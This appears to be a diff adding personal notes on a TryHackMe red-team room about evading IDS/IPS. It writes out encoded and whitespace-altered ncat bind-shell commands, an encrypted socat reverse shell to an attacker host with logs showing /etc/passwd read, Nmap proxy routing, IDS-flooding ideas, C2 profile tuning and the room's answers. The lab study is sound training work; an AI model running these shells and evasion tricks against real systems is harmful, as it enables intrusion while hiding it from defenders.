@@ -221,3 +221,227 @@ output
 
 \u006E\u0063\u0061\u0074\u0020\u002D\u006C\u0076\u006E\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002D\u0065\u0020\u002F\u0062\u0069\u006E\u002F\u0062\u0061\u0073\u0068
 ```
+If you use the format \uXXXX, then ncat -lvnp 1234 -e /bin/bash becomes \u006e\u0063\u0061\u0074\u0020\u002d\u006c\u0076\u006e\u0070\u0020\u0031\u0032\u0033\u0034\u0020\u002d\u0065\u0020\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068. It is clearly a drastic transformation that would help you evade detection, assuming the target system will interpret it correctly and execute it.
+Encrypt the Communication Channel
+Because an IDS/IPS won’t inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key.
+One direct approach is to create the necessary encryption key on the attacker’s system and set socat to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps:
+Create the key
+Listen on the attacker’s machine
+Connect to the attacker’s machine
+Firstly, On the AttackBox or any Linux system, we can create the key using openssl.
+```text
+openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+```
+The arguments in the above command are:
+req indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing.
+-x509 specifies that we want an X.509 certificate
+-newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as -newkey rsa:2048.)
+-days 365 shows that the validity of our certificate will be one year
+-subj sets data, such as organization and country, via the command-line.
+-nodes simplifies our command and does not encrypt the private key
+-keyout PRIVATE_KEY specifies the filename where we want to save our private key
+-out CERTIFICATE specifies the filename to which we want to write the certificate request
+The above command returns:
+Private key: thm-reverse.key
+Certificate: thm-reverse.crt
+The Privacy Enhanced Mail (PEM) .pem file requires the concatenation of the private key .key and the certificate .crt files. We can use cat to create our PEM file from the two files that we have just created:
+cat thm-reverse.key thm-reverse.crt > thm-reverse.pem.
+Secondly, with the PEM file ready, we can start listening while using the key for encrypting the communication with the client.
+socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+If you are not familiar with socat, the options that we used are:
+-d -d provides some debugging data (fatal, error, warning, and notice messages)
+OPENSSL-LISTEN:PORT_NUM indicates that the connection will be encrypted using OPENSSL
+cert=PEM_FILE provides the PEM file (certificate and private key) to establish the encrypted connection
+verify=0 disables checking peer’s certificate
+fork creates a sub-process to handle each new connection.
+Thirdly, on the victim system, socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash. Note that the EXEC invokes the specified program.
+Let’s demonstrate this. On the attacker system, we carried out the following:
+```text
+Pentester Terminal
+
+           
+pentester@TryHackMe$ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+Generating a RSA private key
+........................++++
+......++++
+writing new private key to 'thm-reverse.key'
+-----
+pentester@TryHackMe$ ls
+thm-reverse.crt  thm-reverse.key
+pentester@TryHackMe$ cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
+pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+2022/02/24 13:39:07 socat[1208] W ioctl(6, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device
+2022/02/24 13:39:07 socat[1208] N listening on AF=2 0.0.0.0:4443
+```
+As we have a listener on the attacker system, we switched to the victim machine, and we executed the following:
+```text
+Target Terminal
+
+           
+pentester@target$ socat OPENSSL:10.20.30.129:4443,verify=0 EXEC:/bin/bash
+```
+Back to the attacker system, let’s run cat /etc/passwd:
+```text
+pentester@TryHackMe$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+[...]
+2022/02/24 15:54:28 socat[7620] N starting data transfer loop with FDs [7,7] and [1,1]
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+[...]
+```
+However, if the IDS/IPS inspects the traffic, all the packet data will be encrypted. In other words, the IPS will be completely oblivious to exchange traffic and commands such as cat /etc/passwd. The screenshot below shows how things appear on the wire when captured using Wireshark. The highlighted packet contains cat /etc/passwd; however, it is encrypted.
+```text
+┌──(kali㉿kali)-[~/IDS_IPS_evasion]
+└─$ nano input.txt
+```
+```text
+┌──(kali㉿kali)-[~/IDS_IPS_evasion]
+└─$ base64 input.txt                         
+bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaAo=
+```
+```text
+┌──(kali㉿kali)-[~/IDS_IPS_evasion]
+└─$ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+.....+...+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+.+..+......+..........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+...............+.+.....+............+............+.........+......+....+...........+........................+.+...+......+.....+.+.........+.........+..+......+..........+............+...+...+..+....+...+......+............+........+....+.....+.+.....+............+...............+....+......+............+.....+..........+...........+.+...............+...+.....+.+...........+.+...+..+......................+...+.....+...+..........+......+.....+......+....+......+.................................+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+.+.+...+...+............+...+.....+....+...+..+...+.+.........+...........+.+...+..+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.......+..+.........+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+....................+.........+.+..................+..+..........+.....+...+....+.....+.......+......+.....+...+.......+..+......+...............+......+...+.+..............+......+..........+..+..........+.........+......+........+.........+............+................+.................+.+.........+........+.......+..+.+..............+.+..............+.........+.+...........+.........+...+.+.........+.....+...+.......+...........+....+.....+......+.+...........+...+....+........+....+...........+...+......+.+...+.................+.......+..................+..+.+.....+..........+..+....+...+.....+.......+...+..+....+..+.......+..+...+.+..............+.......+.........+......+......+....................+....+..............+...............+.....................+...+...+....+........+..........+.......................+.......+...+.........+...+...+.....+.......+..+...............+............................+.....+.+.....+............+............+.............+...+....................................+........................+..............+.+..+..........+........+....+..+.+.................+.+.................+...+.+.........+............+....................+............+...+....+......+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+-----
+```
+```text
+┌──(kali㉿kali)-[~/IDS_IPS_evasion]
+└─$ ls
+input.txt  thm-reverse.crt  thm-reverse.key
+```
+```text
+┌──(kali㉿kali)-[~/IDS_IPS_evasion]
+└─$ cat thm-reverse.key thm-reverse.crt > thm-reverse.pem
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ socat OPENSSL:10.11.81.220:4443,verify=0 EXEC:/bin/bash
+```
+```text
+┌──(kali㉿kali)-[~/IDS_IPS_evasion]
+└─$ socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+2022/09/11 11:46:46 socat[43889] N listening on AF=2 0.0.0.0:4443
+2022/09/11 11:47:16 socat[43889] N accepting connection from AF=2 10.11.81.220:53930 on AF=2 10.11.81.220:4443
+2022/09/11 11:47:16 socat[43889] N forked off child process 44038
+2022/09/11 11:47:16 socat[43889] N listening on AF=2 0.0.0.0:4443
+2022/09/11 11:47:17 socat[44038] N no peer certificate and no check
+2022/09/11 11:47:17 socat[44038] N SSL proto version used: TLSv1.3
+2022/09/11 11:47:17 socat[44038] N SSL connection using TLS_AES_256_GCM_SHA384
+2022/09/11 11:47:17 socat[44038] N SSL connection compression "none"
+2022/09/11 11:47:17 socat[44038] N SSL connection expansion "none"
+2022/09/11 11:47:17 socat[44038] N using stdout for reading and writing
+2022/09/11 11:47:17 socat[44038] N starting data transfer loop with FDs [7,7] and [1,1]
+cat /etc/passwd
+root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+```
+However, if the IDS/IPS inspects the traffic, all the packet data will be encrypted. In other words, the IPS will be completely oblivious to exchange traffic and commands such as cat /etc/passwd. The screenshot below shows how things appear on the wire when captured using Wireshark. The highlighted packet contains cat /etc/passwd; however, it is encrypted.
+As you can tell, it is not possible to make sense of the commands or data being exchanged. To better see the value of the added layer of encryption, we will compare this with an equivalent socat connection that does not use encryption.
+On the attacker’s system, we run socat -d -d TCP-LISTEN:4443,fork STDOUT.
+On the victim’s machine, we run socat TCP:10.20.30.129:4443 EXEC:/bin/bash.
+Back on the attacker’s system, we type cat /etc/passwd and hit Enter/Return.
+Because no encryption was used, capturing the traffic exchanged between the two systems will expose the commands, and the traffic exchanged. In the following screenshot, we can see the command sent by the attacker.
+Furthermore, it is a trivial task to follow the TCP stream as it is in cleartext and learn everything exchanged between the attacker and the target system. The screenshot below uses the “Follow TCP Stream” option from Wireshark.
+Modify the data
+Consider the simple case where you want to use Ncat to create a bind shell. The following command ncat -lvnp 1234 -e /bin/bash tells ncat to listen on TCP port 1234 and bind Bash shell to it. If you want to detect packets containing such commands, you need to think of something specific to match the signature but not too specific.
+Scanning for ncat -lvnp can be easily evaded by changing the order of the flags.
+On the other hand, inspecting the payload for ncat - can be evaded by adding an extra white space, such as ncat  - which would still run correctly on the target system.
+If the IDS is looking for ncat, then simple changes to the original command won’t evade detection. We need to consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as nc or socat. Alternatively, you can consider a different encoding if the target system can process it properly.
+Using base64 encoding, what is the transformation of cat /etc/passwd?
+( Question Hint Write the command to a text file. Make sure you end your command with Enter/Return.)
+Y2F0IC9ldGMvcGFzc3dkCg==
+The base32 encoding of a particular string is NZRWC5BAFVWCAOBQHAYAU===. What is the original string?
+*ncat -l 8080*
+Using the provided openssl command above. You created a certificate, which we gave the extension .crt, and a private key, which we gave the extension .key. What is the first line in the certificate file?
+*-----BEGIN CERTIFICATE-----*
+What is the last line in the private key file?
+*-----END PRIVATE KEY-----*
+On the attached machine from the previous task, browse to http://10.10.11.122:8080, where you can write your Linux commands. Note that no output will be returned. A command like ncat -lvnp 1234 -e /bin/bash will create a bind shell that you can connect to it from the AttackBox using ncat 10.10.11.122 1234; however, some IPS is filtering out the command we are submitting on the form. Using one of the techniques mentioned in this task, try to adapt the command typed in the form to run properly. Once you connect to the bind shell using ncat 10.10.11.122 1234, find the user’s name.
+Using an extra space should be sufficient to evade the IPS in this case.
+![[Pasted image 20220911111759.png]]
+```text
+root@ip-10-10-90-128:~# ncat 10.10.11.122 1234
+whoami
+redteamnetsec
+```
+### Evasion via Route Manipulation
+Evasion via route manipulation includes:
+Relying on source routing
+Using proxy servers
+Relying on Source Routing
+In many cases, you can use source routing to force the packets to use a certain route to reach their destination. Nmap provides this feature using the option --ip-options. Nmap offers loose and strict routing:
+Loose routing can be specified using L. For instance, --ip-options "L 10.10.10.50 10.10.50.250" requests that your scan packets are routed through the two provided IP addresses.
+Strict routing can be specified using S. Strict routing requires you to set every hop between your system and the target host. For instance, --ip-options "S 10.10.10.1 10.10.20.2 10.10.30.3" specifies that the packets go via these three hops before reaching the target host.
+Using Proxy Servers
+The use of proxy servers can help hide your source. Nmap offers the option --proxies that takes a list of a comma-separated list of proxy URLs. Each URL should be expressed in the format proto://host:port. Valid protocols are HTTP and SOCKS4; moreover, authentication is not currently supported.
+Consider the following example. Instead of running nmap -sS 10.10.11.122, you would edit your Nmap command to something like nmap -sS HTTP://PROXY_HOST1:8080,SOCKS4://PROXY_HOST2:4153 10.10.11.122. This way, you would make your scan go through HTTP proxy host1, then SOCKS4 proxy host2, before reaching your target. It is important to note that finding a reliable proxy requires some trial and error before you can rely on it to hide your Nmap scan source.
+If you use your web browser to connect to the target, it would be a simple task to pass your traffic via a proxy server. Other network tools usually provide their own proxy settings that you can use to hide your traffic source.
+Protocols used in proxy servers can be HTTP, HTTPS, SOCKS4, and SOCKS5. Which protocols are currently supported by Nmap?
+List in alphabetical order and separate with a single space.
+*HTTP SOCKS4*
+### Evasion via Tactical DoS
+Evasion via tactical DoS includes:
+Launching denial of service against the IDS/IPS
+Launching denial of Service against the logging server
+An IDS/IPS requires a high processing power as the number of rules grows and the network traffic volume increases. Moreover, especially in the case of IDS, the primary response is logging traffic information matching the signature. Consequently, you might find it beneficial if you can:
+Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.
+Create a massive amount of not-malicious traffic that would still make it to the logs. This action would congest the communication channel with the logging server or exceed its disk writing capacity.
+It is also worth noting that the target of your attack can be the IDS operator. By causing a vast number of false positives, you can cause operator fatigue against your “adversary.”
+Make sure you have read and understood the three points of this task.
+*No answer needed*
+### C2 and IDS/IPS Evasion
+Pentesting frameworks, such as Cobalt Strike and Empire, offer malleable Command and Control (C2) profiles. These profiles allow various fine-tuning to evade IDS/IPS systems. If you are using such a framework, it is worth creating a custom profile instead of relying on a default one. Examples variables you can control include the following:
+User-Agent: The tool or framework you are using can expose you via its default-set user-agent. Hence, it is always important to set the user-agent to something innocuous and test to confirm your settings.
+Sleep Time: The sleep time allows you to control the callback interval between beacon check-ins. In other words, you can control how often the infected system will attempt to connect to the control system.
+Jitter: This variable lets you add some randomness to the sleep time, specified by the jitter percentage. A jitter of 30% results in a sleep time of ±30% to further evade detection.
+SSL Certificate: Using your authentic-looking SSL certificate will significantly improve your chances of evading detection. It is a very worthy investment of time.
+DNS Beacon: Consider the case where you are using DNS protocol to exfiltrate data. You can fine-tune DNS beacons by setting the DNS servers and the hostname in the DNS query. The hostname will be holding the exfiltrated data.
+This [CobaltStrike Guideline Profile](https://github.com/bigb0sss/RedTeam-OffensiveSecurity/blob/master/01-CobaltStrike/malleable_C2_profile/CS4.0_guideline.profile) shows how a profile is put together.
+Which variable would you modify to add a random sleep time between beacon check-ins?
+*Jitter*
+### Next-Gen Security
+Next-Generation Network IPS (NGNIPS) has the following five characteristics according to [Gartner](https://www.gartner.com/en/documents/2390317-next-generation-ips-technology-disrupts-the-ips-market):
+Standard first-generation IPS capabilities: A next-generation network IPS should achieve what a traditional network IPS can do.
+Application awareness and full-stack visibility: Identify traffic from various applications and enforce the network security policy. An NGNIPS must be able to understand up to the application layer.
+Context-awareness: Use information from sources outside of the IPS to aid in blocking decisions.
+Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic.
+Agile engine: Support upgrade paths to benefit from new information feeds.
+Because a Next-Generation Firewall (NGFW) provides the same functionality as an IPS, it seems that the term NGNIPS is losing popularity for the sake of NGFW. You can read more about NGFW in the Red Team Firewalls room.
+### Summary
+In this room, we covered IDS and IPS types based on installation location and detection engine. We also considered Snort 2 rules as an example of how IDS rules are triggered. To evade detection, one needs to gather as much information as possible about the deployed devices and experiment with different techniques. In other words, trial and error might be inevitable unless one has complete knowledge of the security devices and their configuration.
+Using Command and Control (C2) frameworks provides their contribution to IPS evasion via controlling the shape of the traffic to make it as innocuous as it can get. C2 profiles are a critical feature that one should learn to master if they use any C2 framework that supports malleable profiles.
+Continue your learning with the next room.
+*No answer needed*
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/112f5abb83ffd40a8ce514980242ce60.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0925b08163ea115da03213b6fd846296.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/61e14978e7f97e0de5d467babc3cfbff.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/96f0a2f30ee8ec440b1b86cd971e4b43.png)
+- ![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c87c5c8f40d0252a9b04495a9527f133.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/41b5c14bf8cb0a7be5d0f7856748c27f.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3c82c010e4fe88cefb53991fd58c762a.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/dba39db8e9ffe2adeae19a57e8fb01dd.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b42ec04cbb84ddd7c08f168be25c4215.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0826134be47960f6466b84c0d5407654.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b85668a256470594ea8a6310f68b5f86.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/b468bdac68d5dff8f70e457580531f2c.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f330a782dc93a8b227fc93231aa1649a.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3352df7b863f48cfaf0aee8f308e95a9.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/08f8e9b8cdae4878dab23cbb57dfbbe2.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/40f0e2f428db90b8b57d708d77eae99c.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a896c0f0840e5f0352fa4fce1e450322.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/6f22c26259a5cfe6a435579ec05f7e0d.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/be938e16d046189bea6669d5f17cff11.png)
+
+## Notes / Lessons Learned
+[[Sandbox Evasion]]
+
